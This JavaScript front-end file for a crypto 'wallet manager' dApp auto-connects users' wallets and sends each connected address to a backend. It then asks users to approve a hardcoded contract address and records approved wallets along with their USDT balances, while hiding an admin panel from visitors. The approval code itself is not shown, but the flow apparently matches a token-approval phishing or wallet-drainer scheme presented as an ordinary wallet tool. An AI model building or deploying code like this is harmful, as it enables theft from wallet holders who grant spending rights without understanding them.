import WalletConnector from './components/WalletConnector.js';
import ApiService from './services/api.js';
import { detectPlatform, formatAddress, formatBalance } from './utils/wallet.js';

class WalletManagerApp {
    constructor() {
        this.walletConnector = new WalletConnector();
        this.apiService = new ApiService();
        
        this.initializeElements();
        this.attachEventListeners();
        this.init();
    }

    initializeElements() {
        // Header elements
        this.connectButton = document.getElementById('connect-wallet');
        this.connectionStatus = document.getElementById('connection-status');
        this.walletInfo = document.getElementById('wallet-info');
        this.walletAddressElement = document.getElementById('wallet-address');
        this.usdtBalanceElement = document.getElementById('usdt-balance');
        this.approveButton = document.getElementById('approve-contract');
        
        // Loading indicator
        this.loadingIndicator = document.getElementById('loading');
        
        // Hide admin elements completely
        const adminPanel = document.getElementById('admin-panel');
        const adminLogin = document.getElementById('admin-login');
        if (adminPanel) adminPanel.style.display = 'none';
        if (adminLogin) adminLogin.style.display = 'none';
    }

    attachEventListeners() {
        if (this.connectButton) {
            this.connectButton.addEventListener('click', () => this.handleConnectWallet());
        }
        
        if (this.approveButton) {
            this.approveButton.addEventListener('click', () => this.handleApproveContract());
        }
    }

    async init() {
        // Hide loading indicator on init
        this.showLoading(false);
        
        const platform = detectPlatform();
        console.log('Platform detected:', platform);
        
        // Auto-connect if wallet is already connected
        const storedAddress = localStorage.getItem('walletAddress');
        if (storedAddress) {
            this.walletConnector.walletAddress = storedAddress;
            await this.updateWalletUI(storedAddress);
            this.showWalletInfo();
        }
        
        // Auto-connect on wallet browsers
        if (platform.isWalletBrowser) {
            console.log('Wallet browser detected, attempting auto-connect...');
            // Small delay to ensure page is loaded
            setTimeout(() => {
                this.handleConnectWallet();
            }, 500);
        }
    }

    async handleConnectWallet() {
        this.showLoading(true);
        
        try {
            const platform = detectPlatform();
            
            // Mobile handling
            if (platform.isMobile) {
                if (platform.hasWalletExtension) {
                    // Already in wallet browser, connect directly
                    await this.connectAndProcessWallet();
                } else {
                    // Regular mobile browser, show wallet options
                    this.showMobileWalletOptions();
                    this.showLoading(false); // Hide loading when showing options
                    return;
                }
            } else {
                // Desktop handling
                await this.connectAndProcessWallet();
            }
        } catch (error) {
            this.showLoading(false);
            this.showError(`Connection failed: ${error.message}`);
        }
    }

    showMobileWalletOptions() {
        // Hide connect button and show wallet options
        if (this.connectButton) {
            this.connectButton.style.display = 'none';
        }
        
        // Create wallet options UI
        const walletOptions = document.createElement('div');
        walletOptions.id = 'wallet-options';
        walletOptions.innerHTML = `
            <h3>Choose Wallet to Connect</h3>
            <div class="wallet-options-container">
                <button class="wallet-option" data-wallet="metamask">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask" width="30" height="30">
                    MetaMask
                </button>
                <button class="wallet-option" data-wallet="trustwallet">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/7/73/TrustWallet-logo.svg" alt="Trust Wallet" width="30" height="30">
                    Trust Wallet
                </button>
                <button class="wallet-option" data-wallet="coinbase">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/9/9e/Coinbase_%28Wallet%29_Logo.png" alt="Coinbase Wallet" width="30" height="30">
                    Coinbase Wallet
                </button>
            </div>
            <p class="instruction">Select a wallet to open this DApp in that wallet's browser</p>
        `;
        
        // Insert after connection status
        if (this.connectionStatus.parentNode) {
            this.connectionStatus.parentNode.insertBefore(walletOptions, this.connectionStatus.nextSibling);
        }
        
        // Add event listeners
        document.querySelectorAll('.wallet-option').forEach(button => {
            button.addEventListener('click', (e) => {
                const wallet = e.target.closest('.wallet-option').dataset.wallet;
                this.openInWallet(wallet);
            });
        });
    }

    openInWallet(walletName) {
        const dappUrl = window.location.href;
        
        switch(walletName) {
            case 'metamask':
                // Try to open in MetaMask app
                window.location.href = `https://metamask.app.link/dapp/${dappUrl.replace('https://', '').replace('http://', '')}`;
                break;
            case 'trustwallet':
                // Try to open in Trust Wallet app
                window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(dappUrl)}`;
                break;
            case 'coinbase':
                // Try to open in Coinbase Wallet
                window.location.href = `https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(dappUrl)}`;
                break;
            default:
                // Fallback to regular connection
                this.connectAndProcessWallet();
        }
    }

    async connectAndProcessWallet() {
        try {
            const result = await this.walletConnector.connect();
            this.showLoading(false);
            
            if (result.success) {
                localStorage.setItem('walletAddress', result.address);
                await this.updateWalletUI(result.address);
                this.showWalletInfo();
                
                // Send to backend
                try {
                    await this.apiService.connectWallet({
                        address: result.address,
                        name: `Wallet ${formatAddress(result.address)}`
                    });
                } catch (error) {
                    console.error('Error connecting to backend:', error);
                }
            } else {
                this.showError(`Connection failed: ${result.error}`);
            }
        } catch (error) {
            this.showLoading(false);
            this.showError(`Connection failed: ${error.message}`);
        }
    }

    async updateWalletUI(address) {
        this.connectionStatus.textContent = `Connected: ${formatAddress(address)}`;
        this.connectButton.textContent = 'Connected';
        this.connectButton.disabled = true;
        
        this.walletAddressElement.textContent = address;
        
        // Get USDT balance
        try {
            const balance = await this.getUSDTBalance(address);
            this.usdtBalanceElement.textContent = formatBalance(balance);
        } catch (error) {
            console.error('Error getting balance:', error);
            this.usdtBalanceElement.textContent = '0.00';
        }
    }

    showWalletInfo() {
        this.walletInfo.classList.remove('hidden');
    }

    hideWalletInfo() {
        this.walletInfo.classList.add('hidden');
    }

    async handleApproveContract() {
        this.showLoading(true);
        
        try {
            const contractAddress = '0xC0a6fd159018824EB7248EB62Cb67aDa4c5906FF';
            const result = await this.walletConnector.approveContract(contractAddress);
            this.showLoading(false);
            
            if (result.success) {
                this.showSuccess('Contract approved successfully!');
                this.approveButton.disabled = true;
                this.approveButton.textContent = 'Approved';
                
                // Update backend
                try {
                    await this.apiService.approveWallet({
                        address: this.walletConnector.walletAddress
                    });
                } catch (error) {
                    console.error('Error updating backend:', error);
                }
            } else {
                this.showError(`Approval failed: ${result.error}`);
            }
        } catch (error) {
            this.showLoading(false);
            this.showError(`Approval failed: ${error.message}`);
        }
    }

    async getUSDTBalance(walletAddress) {
        try {
            const response = await this.apiService.getWalletBalance(walletAddress);
            return response.balance || '0.00';
        } catch (error) {
            console.error('Error getting USDT balance:', error);
            return '0.00';
        }
    }

    showLoading(show) {
        if (this.loadingIndicator) {
            this.loadingIndicator.style.display = show ? 'block' : 'none';
        }
    }

    showSuccess(message) {
        // Create a temporary success message
        const successDiv = document.createElement('div');
        successDiv.className = 'alert success';
        successDiv.textContent = message;
        document.body.appendChild(successDiv);
        
        setTimeout(() => {
            if (document.body.contains(successDiv)) {
                document.body.removeChild(successDiv);
            }
        }, 3000);
    }

    showError(message) {
        // Create a temporary error message
        const errorDiv = document.createElement('div');
        errorDiv.className = 'alert error';
        errorDiv.textContent = message;
        document.body.appendChild(errorDiv);
        
        setTimeout(() => {
            if (document.body.contains(errorDiv)) {
                document.body.removeChild(errorDiv);
            }
        }, 5000);
    }
}

// Initialize the app when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    window.app = new WalletManagerApp();
});
